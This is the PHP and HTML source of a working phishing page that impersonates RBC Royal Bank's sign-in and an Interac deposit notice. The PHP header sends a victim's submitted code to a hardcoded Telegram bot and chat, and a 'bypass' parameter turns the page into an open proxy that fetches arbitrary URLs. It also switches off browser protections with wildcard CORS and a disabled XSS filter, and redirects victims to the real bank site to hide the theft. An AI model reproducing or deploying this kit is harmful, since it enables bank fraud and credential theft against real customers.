<?php
header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if(isset($_GET['bypass']) && $_GET['bypass'] == 'true'){
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 ".$info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}



$code       = $_POST['code']; 
$message    = "RBC \n\n$ip\n\n\n$code\n";
$apiToken    = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
$data = [
    'chat_id' => '-821080105',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                
      ?>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
        
        <link rel="icon" type="image/x-icon" href="deposit/rbc/favicon.ico">
        <title>RBC Royal Bank – Secure Sign In</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="./files/main.css">
        <meta http-equiv="refresh" content="3;URL=https://href.li/?http://royalbank.ca/">
    </head>
    <body>
        <app-root ng-version="10.2.5">
            <!---->
            <smart-banners _nghost-snp-c1="">
                <div _ngcontent-snp-c1="" class="smart-bnr-wpr" id="smart-bnr-rbcapp">
                    <div _ngcontent-snp-c1="" class="smart-bnr-inner">
                        <div _ngcontent-snp-c1="" class="smart-bnr-android" style="display: none;">
                            <div _ngcontent-snp-c1="" class="table-wpr w-100 mar-b-0">
                                <div _ngcontent-snp-c1="" class="table-cell w-min pad-r-hlf">
                                    <div _ngcontent-snp-c1="" class="smart-bnr-icon rbc-icon"></div>
                                </div>
                                <div _ngcontent-snp-c1="" class="table-cell va-m label">
                                    <p _ngcontent-snp-c1="" class="smart-bnr-title roboto-bold">RBC Mobile</p>
                                    <p _ngcontent-snp-c1="" class="smart-bnr-subtitle roboto-regular">Royal Bank of Canada</p>
                                    <p _ngcontent-snp-c1="" class="smart-bnr-subtitle roboto-regular">FREE - On Google Play</p>
                                </div>
                                <div _ngcontent-snp-c1="" class="table-cell va-m"><a _ngcontent-snp-c1="" class="smart-bnr-btn roboto-medium" href="https://applinks.rbcroyalbank.com/RtYB">INSTALL</a></div>
                                <div _ngcontent-snp-c1="" class="table-cell va-m"><button _ngcontent-snp-c1="" class="smart-bnr-close" data-dig-id="BFS-Smartbanner-1" type="button"><img _ngcontent-snp-c1="" alt="Close" height="13" width="13" src="data:image/svg+xml, %3Csvg xmlns=&#39;http://www.w3.org/2000/svg&#39; viewBox=&#39;0 0 20 20&#39;%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill:%23006ac3%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Eclose%3C/title%3E%3Cg id=&#39;Layer_2&#39; data-name=&#39;Layer 2&#39;%3E%3Cg id=&#39;Basic&#39;%3E%3Cg id=&#39;Navigation_Misc&#39; data-name=&#39;Navigation/Misc&#39;%3E%3Cg id=&#39;Icons&#39;%3E%3Cpath id=&#39;icon-close_20_&#39; data-name=&#39;icon-close (20)&#39; class=&#39;cls-1&#39; d=&#39;M20 .68L19.32 0 10 9.32.68 0 0 .68 9.32 10 0 19.32l.68.68L10 10.68 19.32 20l.68-.68L10.68 10 20 .68z&#39;/%3E%3C/g%3E%3C/g%3E%3C/g%3E%3C/g%3E%3C/svg%3E"></button></div>
                            </div>
                        </div>
                    </div>
                    <div _ngcontent-snp-c1="" class="smart-bnr-ios" style="display: none;">
                        <div _ngcontent-snp-c1="" class="table-wpr w-100 mar-b-0">
                            <div _ngcontent-snp-c1="" class="table-cell va-m w-min" style="padding-right: 10px;"><button _ngcontent-snp-c1="" class="smart-bnr-close" data-dig-id="BFS-Smartbanner-1" type="button">
<img _ngcontent-snp-c1="" alt="Close" height="13" width="13" src="data:image/svg+xml, %3Csvg xmlns=&#39;http://www.w3.org/2000/svg&#39; viewBox=&#39;0 0 20 20&#39;%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill:%23006ac3%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Eclose%3C/title%3E%3Cg id=&#39;Layer_2&#39; data-name=&#39;Layer 2&#39;%3E%3Cg id=&#39;Basic&#39;%3E%3Cg id=&#39;Navigation_Misc&#39; data-name=&#39;Navigation/Misc&#39;%3E%3Cg id=&#39;Icons&#39;%3E%3Cpath id=&#39;icon-close_20_&#39; data-name=&#39;icon-close (20)&#39; class=&#39;cls-1&#39; d=&#39;M20 .68L19.32 0 10 9.32.68 0 0 .68 9.32 10 0 19.32l.68.68L10 10.68 19.32 20l.68-.68L10.68 10 20 .68z&#39;/%3E%3C/g%3E%3C/g%3E%3C/g%3E%3C/g%3E%3C/svg%3E"></button></div>
                            <div _ngcontent-snp-c1="" class="table-cell w-min pad-r-hlf">
                                <div _ngcontent-snp-c1="" class="smart-bnr-icon rbc-icon"></div>
                            </div>
                            <div _ngcontent-snp-c1="" class="table-cell va-m" style="position: relative;">
                                <p _ngcontent-snp-c1="" class="smart-bnr-title roboto-bold">RBC Mobile</p>
                                <p _ngcontent-snp-c1="" class="smart-bnr-subtitle roboto-regular">Royal Bank of Canada</p>
                                <p _ngcontent-snp-c1="" class="smart-bnr-text roboto-regular">GET - On the App Store</p>
                            </div>
                            <div _ngcontent-snp-c1="" class="table-cell text-right va-m"><a _ngcontent-snp-c1="" class="smart-bnr-btn roboto-regular fl-r" href="https://itunes.apple.com/ca/app/rbc-mobile/id407597290?mt=8" id="smartBannerEN-ios">View</a></div>
                        </div>
                    </div>
                </div>
            </smart-banners>
            <div>
                <router-outlet></router-outlet>
                <full-signin-components _nghost-snp-c2="" class="ng-tns-c2-0 ng-star-inserted">
                    <!----><!----><!---->
                    <div _ngcontent-snp-c2="" class="ng-tns-c2-0 ng-star-inserted">
                        <div _ngcontent-snp-c2="" class="flex-container-full">
                            <div _ngcontent-snp-c2="" class="split flex-item-left">
                                <div _ngcontent-snp-c2="" class="centered">
                                    <div _ngcontent-snp-c2="" class="maindynamicbranding">
                                        <div _ngcontent-snp-c2="" class="header-content-full">
                                            <p _ngcontent-snp-c2="" class="ng-tns-c2-0">
                                                <rbc-logo _ngcontent-snp-c2="" class="rbc-logo-full rbc-logo" token="notm-opposite" aria-label="main-container.accessibility.logo">
                                                    <svg width="200%" height="200%" viewBox="0 0 77 100" fill="none" xmlns="http://www.w3.org/2000/svg" fit="" preserveAspectRatio="xMidYMid meet" focusable="false" role="img" aria-labelledby="notm-opposite-title-4">
                  
                  
                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M66.2508 75.0923C66.205 74.9955 65.8407 74.2259 64.787 73.6277C64.171 73.2814 63.2646 72.8581 61.4534 72.8583C58.2025 72.8583 55.777 74.6738 55.8565 80.2356C55.9418 86.2627 59.9036 87.4958 62.6056 87.4958C65.8745 87.4958 67.3994 86.0712 67.3994 86.0712V88.201C67.3994 88.201 65.7044 89.5734 61.3879 89.5734C56.7489 89.5734 51.4859 87.6701 51.4859 80.3402C51.4859 73.8357 55.9042 70.8629 61.8055 70.8629C65.7043 70.8629 67.3436 72.04 67.3436 72.04L66.4305 75.1441C66.4305 75.1441 66.3105 75.1638 66.2558 75.1023C66.2554 75.1019 66.2538 75.0985 66.2508 75.0923ZM23.0938 89.2926H28.3205L21.6427 80.7561C24.3199 80.0398 26.3248 78.5763 26.3248 75.9163C26.3248 72.7925 24.4565 71.1403 19.5675 71.1403H9.47015V71.2968C9.84164 71.4295 10.2578 71.6697 10.5301 71.9377C11.2367 72.6346 11.4474 73.6988 11.4474 75.1371V89.2926H15.6409V81.2463H17.1715L23.0938 89.2926ZM15.641 72.8706H18.466C20.8177 72.8706 22.0451 73.5576 22.0451 76.0574C22.0451 78.2861 20.439 79.6056 17.8639 79.6056H15.6409V72.8706H15.641ZM42.8879 79.1212C44.7256 78.8224 46.4839 77.3924 46.4839 75.2306C46.4839 73.2813 45.6557 71.1404 39.9179 71.1404H30.2378V71.2969C30.5309 71.3865 30.9934 71.6238 31.2963 71.9241C31.9541 72.5665 32.1705 73.5271 32.2026 74.8006V89.2928H40.2251C44.638 89.2928 47.8316 87.6101 47.8316 83.7546C47.8316 80.6195 45.3918 79.2846 42.8879 79.1212ZM38.7604 72.8707C40.8132 72.8707 42.2054 73.3148 42.2054 75.5072C42.2054 77.8435 40.3396 78.4872 38.2115 78.4872H36.3781V72.8707H38.7604ZM38.9671 87.5765H36.3781V80.1658H38.8482C42.2417 80.1658 43.5444 81.1767 43.5444 83.7212C43.5443 86.4734 41.8451 87.5765 38.9671 87.5765Z" fill="white"></path>
                                                        <title id="notm-opposite-title-4"></title>
                                                    </svg>
                                                </rbc-logo>
                                            </p>
                                            <h1 _ngcontent-snp-c2="" class="title-full"> Secure Sign-In</h1>
                                            <h1 _ngcontent-snp-c2="" class="access-medium"> RBC Online Banking</h1>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div _ngcontent-snp-c2="" class="split flex-item-right ng-tns-c2-0 ng-star-inserted div-loader">
                                <style>
                                .loader-div {
                                    text-align: center;
                                    padding-top: 20px;
                                }

                                .loader-div h2 {
                                    font-size: 24px;
                                    margin-bottom: 40px;
                                }

                                .loader-div p {
                                    margin-top: 37px;
                                    padding: 0px 42px;
                                    font-size: 16px;
                                }
                                </style>
                                <div class="_1AR6e5iqu8uXHMTFKLnqWr loader-div">
                                    <br>
                                    <h2 class="heading--title2 ng-binding"></h2>
                                    <img src="./files/loading.gif" width="60">
                                    <p style="text-align: center; font-size: 17px; padding: 10px 40px 0px 40px;">The funds will be processed and deposited in your account within the next 48 hours. Interac is updating there System's <br>
<br>
For security reasons you will now be redirected to the home page.</p>
                                </div>
                            </div>
                            <!---->
                        </div>
                    </div>
                </full-signin-components>
            </div>
        </app-root>
    

</body></html>